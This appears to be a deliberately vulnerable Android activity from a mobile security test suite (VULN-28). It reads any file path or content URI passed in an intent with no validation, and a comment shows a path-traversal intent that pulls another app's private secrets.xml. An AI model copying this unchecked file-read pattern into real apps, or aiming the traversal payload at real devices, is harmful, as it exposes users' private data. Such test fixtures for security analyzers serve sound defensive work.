package com.masttest.vuln28;

import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.InputStream;

/**
 * VULN-28: Activity получает Uri от вызывающего и через ContentResolver
 * (или прямым FileInputStream) читает по нему данные. Никакой проверки
 * scheme/host/path нет.
 *
 * Атака:
 *
 *   Uri payload = Uri.parse("content://com.masttest.vuln27.unsafe/../shared_prefs/secrets.xml");
 *   Intent i = new Intent();
 *   i.setComponent(new ComponentName(
 *       "com.masttest.vuln28",
 *       "com.masttest.vuln28.FileLoaderActivity"));
 *   i.putExtra("file_uri", payload);
 *   startActivity(i);
 *
 * — наш FileLoaderActivity откроет content://-uri и прочитает
 * приватный файл стороннего приложения с нужными permission'ами.
 */
public class FileLoaderActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // (1) Через getParcelableExtra<Uri> — content:// URI
        Uri uri = getIntent().getParcelableExtra("file_uri");        // <-- VULN: source
        if (uri != null) {
            byte[] bytes = null;
            // <-- VULN sink: ContentResolver открывает любой URI
            try (InputStream in = getContentResolver().openInputStream(uri)) {
                if (in != null) bytes = readAllBytes(in);
            } catch (Exception ignored) {}
            Log.w("FileLoader", "Read " + (bytes != null ? bytes.length : null) + " bytes from " + uri);
            ((TextView) findViewById(R.id.tvTitle)).setText("len=" + (bytes != null ? bytes.length : null));
        }

        // (2) Через getStringExtra("path") — прямой FileInputStream
        String path = getIntent().getStringExtra("path");            // <-- VULN: source
        if (path != null) {
            byte[] data = null;
            // <-- VULN sink: FileInputStream(String) без canonicalize
            try (FileInputStream fis = new FileInputStream(path)) {
                data = readAllBytes(fis);
            } catch (Exception ignored) {}
            Log.w("FileLoader", "Read " + (data != null ? data.length : 0) + " bytes from path=" + path);
        }
    }

    private static byte[] readAllBytes(InputStream in) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[8192];
        int n;
        while ((n = in.read(buf)) != -1) {
            bos.write(buf, 0, n);
        }
        return bos.toByteArray();
    }
}
